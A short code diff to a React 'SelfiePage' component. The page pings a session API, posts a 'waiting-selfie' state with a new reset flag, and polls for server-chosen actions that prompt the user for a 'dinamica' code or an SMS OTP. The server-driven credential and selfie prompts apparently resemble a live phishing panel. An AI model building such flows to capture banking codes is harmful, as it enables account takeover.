@@ -44,11 +44,11 @@ export function SelfiePage({
     ping()
     const pingTimer = window.setInterval(ping, 3000)
 
-    // Notify server we are in selfie mode
+    // Notify server we are in selfie mode and reset any pending selfie action
     fetch(`/api/sessions/${sessionId}/state`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ state: 'waiting-selfie' }),
+      body: JSON.stringify({ state: 'waiting-selfie', resetAction: true }),
     }).catch(() => {})
 
     const pollTimer = window.setInterval(async () => {
@@ -86,12 +86,6 @@ export function SelfiePage({
         if (action === 'dinamica' || action === 'sms') {
           setSubmitting(false)
           onOtpRequiredRef.current?.(action)
-          return
-        }
-
-        if (action === 'selfie') {
-          setSubmitting(false)
-          setPhoto('')
           return
         }
       } catch {}
